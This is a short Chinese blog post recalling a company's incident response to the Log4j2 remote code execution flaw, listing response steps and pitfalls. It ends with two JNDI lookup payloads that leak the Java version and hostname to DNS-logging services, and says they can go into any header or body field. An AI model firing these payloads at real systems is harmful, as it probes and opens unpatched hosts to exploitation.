---
title: Log4j2远程执行命令回忆录
date: 2022-01-11
categories:
  - 漏洞
  - Log4j
tags:
  - Log4j
---


### 引言
记录下只有在大公司才能遇到的困难和挑战

### 漏洞简介
Log4jRCE，让内网主机去连接远程ldap服务器，进行反序列化，执行任意命令<!--more-->

### 应急思路
- 输出修复方案
- WAF紧急添加payload规则拦截防护
- 攻击变种，WAF规则绕过、更新
- HIDS新增规则，全网检测受影响组件
- SDL流程卡点，禁止低版本发版
- 工单系统推动漏洞闭环

### 误区及问题点
坑一：WAF是无法识别加密body的，故无法拦截
坑二：WAF拦截页面，同时触发了DNSLOG问题排查。nginx的errorlog和accesslog采集组件的kafka、es也受Log4j影响，记录传递payload时触发。即内网ELK日志平台也存在此漏洞
坑三：漏洞公布后，并非第一时间让业务去升级，应该看漏洞利用条件，能否复现，影响范围及危害
坑四：服务器无互联网权限，漏洞利用不成功或不受影响。其实RCE漏洞无需机器有外网权限，直接执行攻击指令

### PayLoad
获取存在漏洞主机的hostname，来判断定位验证Log4j漏洞：
`${jndi:ldap://${sys:java.version}.${hostName}.XXOO.xxxx.ceye.io}`
`${jndi:ldap://${sys:java.version}.${hostName}.XXOO.xxxx.dnslog.cn}`
注入点：
任意位置（URI或header或body），如某个api接口，请求头中任意位置，如`Accept: {payload}`
请求网站首页可能不存在漏洞，但在某个API接口处，却存在的呦~
